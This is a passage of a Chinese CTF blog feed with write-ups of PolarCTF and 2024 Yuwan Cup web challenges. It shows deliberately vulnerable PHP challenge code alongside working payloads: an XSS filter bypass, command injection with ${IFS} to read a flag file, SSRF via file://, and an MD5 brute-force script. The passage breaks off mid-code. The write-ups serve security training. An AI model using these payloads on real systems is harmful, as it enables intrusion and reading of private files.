punctuation">;</span> Googlebot<span class="token operator">/</span><span class="token number">2.1</span><span class="token punctuation">;</span> <span class="token operator">+</span>http<span class="token punctuation">:</span><span class="token comment">//www.google.com/bot.html)</span>Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>compatible<span class="token punctuation">;</span> YandexAccessibilityBot<span class="token operator">/</span><span class="token number">3.0</span><span class="token punctuation">;</span> <span class="token operator">+</span>http<span class="token punctuation">:</span><span class="token comment">//yandex.com/bots)</span><span class="token comment"># 库与网络工具的用户代理字符串</span>PostmanRuntime<span class="token operator">/</span><span class="token number">7.26</span><span class="token number">.5</span>curl<span class="token operator">/</span><span class="token number">7.64</span><span class="token number">.1</span><span class="token comment"># 微软 Edge 用户代理字符串</span>Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>Windows <span class="token constant">NT</span> <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span><span class="token constant">KHTML</span><span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">91.0</span><span class="token number">.4472</span><span class="token number">.124</span> Safari<span class="token operator">/</span><span class="token number">537.36</span> Edg<span class="token operator">/</span><span class="token number">91.0</span><span class="token number">.864</span><span class="token number">.59</span><span class="token comment"># Opera 用户代理字符串</span>Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token constant">X11</span><span class="token punctuation">;</span> Linux x86_64<span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span><span class="token constant">KHTML</span><span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">51.0</span><span class="token number">.2704</span><span class="token number">.106</span> Safari<span class="token operator">/</span><span class="token number">537.36</span> <span class="token constant">OPR</span><span class="token operator">/</span><span class="token number">38.0</span><span class="token number">.2220</span><span class="token number">.41</span><span class="token comment"># Chrome 用户代理字符串</span>Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token constant">X11</span><span class="token punctuation">;</span> Linux x86_64<span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span><span class="token constant">KHTML</span><span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">51.0</span><span class="token number">.2704</span><span class="token number">.103</span> Safari<span class="token operator">/</span><span class="token number">537.36</span><span class="token comment"># Firefox 用户代理字符串</span>Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>platform<span class="token punctuation">;</span> rv<span class="token punctuation">:</span>geckoversion<span class="token punctuation">)</span> Gecko<span class="token operator">/</span>geckotrail Firefox<span class="token operator">/</span>firefoxversion</code></pre><h4 id="浮生日记-xss"><a href="#浮生日记-xss" class="headerlink" title="浮生日记(xss)"></a>浮生日记(xss)</h4><p><img src="xss.png" loading="lazy"></p><p>有点像xss但是过滤了基本的</p><p><img src="xss_2.png" loading="lazy"></p><p>先闭合<code>&quot;</code>然后在双写试试</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">"<span class="token operator">></span><span class="token operator">&lt;</span>scrscriptipt<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>scrscriptipt<span class="token operator">></span></code></pre><h4 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$$(GLOBALS)"></a>$$(GLOBALS)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*PolarD&amp;N CTF*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag|\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"oh on!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"var_dump(<span class="token interpolation"><span class="token variable">$$a</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$GLOBALS</span>：引用全局作用域中可用的全部变量（一个包含了全部变量的全局组合数组。变量的名字就是数组的键），与所有其他超全局变量不同，<span class="token variable">$GLOBALS</span>在<span class="token constant">PHP</span>代码中任何地方总是可用的<span class="token keyword">global</span>在<span class="token constant">PHP</span>中的解析是：<span class="token keyword">global</span>的作用是定义全局变量<span class="token punctuation">,</span>但是这个全局变量不是应用于整个网站<span class="token punctuation">,</span>而是应用于当前页面<span class="token punctuation">,</span>包括<span class="token keyword">include</span>或<span class="token keyword">require</span>的所有文件。注：在函数体内定义的<span class="token keyword">global</span>变量<span class="token punctuation">,</span>函数体外可以使用<span class="token punctuation">,</span>在函数体外定义的<span class="token keyword">global</span>变量不能在函数体内使用</code></pre><h4 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span><span class="token comment">#62位</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$a</span> <span class="token operator">&lt;</span> <span class="token number">62</span><span class="token punctuation">;</span> <span class="token variable">$a</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$b</span> <span class="token operator">&lt;</span> <span class="token number">62</span><span class="token punctuation">;</span> <span class="token variable">$b</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$b</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token variable">$flag</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><h4 id="XFF"><a href="#XFF" class="headerlink" title="XFF"></a>XFF</h4><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">X-Forwarded-For</span><span class="token punctuation">:</span> <span class="token header-value">1.1.1.1</span></span></code></pre><h4 id="rce1"><a href="#rce1" class="headerlink" title="rce1"></a>rce1</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ /"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ping -c 4 <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$ip</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span>        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">/</span><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">;</span><span class="token class-name type-declaration">tac</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span>fllllaaag<span class="token operator">.</span>php<span class="token comment">#</span></code></pre><h4 id="GET-POST"><a href="#GET-POST" class="headerlink" title="GET-POST"></a>GET-POST</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">/*PolarD&amp;N CTF*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//文件包含，flag在flag.php文件中，不用想了你访问也没用</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"你必须让我感受到你的真诚，用GET请求传递一下id吧，令id=1"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$id</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"干的漂亮"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br/>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"虽然我感受到了你的真诚，但还是不行，用POST请求传递一下jljcxy吧，令jljcxy=flag"</span><span class="token punctuation">;</span>    <span class="token variable">$jljcxy</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'jljcxy'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$jljcxy</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>你必须让我感受到你的真诚，用<span class="token constant">GET</span>请求传递一下id吧，令id<span class="token operator">=</span><span class="token number">1</span></span></code></pre><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token constant">POST</span><span class="token punctuation">:</span> jljcxy<span class="token operator">=</span>flag</code></pre><h4 id="被黑掉的站"><a href="#被黑掉的站" class="headerlink" title="被黑掉的站"></a>被黑掉的站</h4><p><img src="hacked_web.png" loading="lazy"></p><p><code>index.php.bak</code>里都是弱口令 去爆破shell.php的密码即可</p>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PolarCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024御宛杯-web</title>
      <link href="/2024/09/15/2024%E5%BE%A1%E5%AE%9B%E6%9D%AF-web/"/>
      <url>/2024/09/15/2024%E5%BE%A1%E5%AE%9B%E6%9D%AF-web/</url>
      
        <content type="html"><![CDATA[<h4 id="来签个到吧"><a href="#来签个到吧" class="headerlink" title="来签个到吧~~"></a>来签个到吧~~</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"\x69\x64"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\150\x65\156\141\156"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">goto</span> lklsgyy<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">echo</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\107\132\103\124\106\137\106\114\101\107"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> lklsgyy<span class="token punctuation">:</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"\x69\x64"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\150\x65\156\141\156"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">goto</span> lklsgyy<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span></code></pre><ul><li><code>\x69\x64</code> 是一个十六进制转义序列，表示字符串 <code>&quot;id&quot;</code>。</li><li><code>\150\x65\156\141\156</code> 是一个八进制和十六进制转义序列，表示字符串 <code>&quot;henan&quot;</code>。</li><li><code>base64_encode(&quot;\150\x65\156\141\156&quot;)</code> 将字符串 <code>&quot;henan&quot;</code> 编码为base64。</li></ul><p>代码检查 <code>$_REQUEST</code> 数组中的 <code>id</code> 参数（包括 <code>$_GET</code> 和 <code>$_POST</code> 数据）是否等于 <code>&quot;henan&quot;</code> 的base64编码值。</p><ul><li><code>&quot;henan&quot;</code> 的base64编码值是 <code>&quot;aGVuYW4=&quot;</code>。</li></ul><p>如果 <code>id</code> 参数不等于 <code>&quot;aGVuYW4=&quot;</code>，代码会跳转到标签 <code>lklsgyy</code>。</p><h4 id="记得匿名哟"><a href="#记得匿名哟" class="headerlink" title="记得匿名哟~"></a>记得匿名哟~</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">class</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//这行代码销毁了变量 $a，因此之前创建的匿名类实例不再可用。</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'class'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><h4 id="搜索一下"><a href="#搜索一下" class="headerlink" title="搜索一下"></a>搜索一下</h4><p>SSRF使用file协议即可</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">geturl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;b>flag在/flag.txt&lt;/b>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">geturl</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"    &lt;!DOCTYPE html>    &lt;html>    &lt;head>    &lt;meta charset='UTF-8'>&lt;/head>&lt;body>&lt;form method='post'>&lt;input type='text' name='url' placeholder='输入网址'>&lt;input type='submit' name='submit' placeholder='提交'>&lt;/form>&lt;/body>    &lt;/html>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span>url<span class="token operator">=</span>file<span class="token punctuation">:</span><span class="token comment">///flag.txt</span></code></pre><h4 id="你知道SESSION吗-session反序列化逃逸"><a href="#你知道SESSION吗-session反序列化逃逸" class="headerlink" title="你知道SESSION吗(session反序列化逃逸)"></a>你知道SESSION吗(session反序列化逃逸)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">HelloEva</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 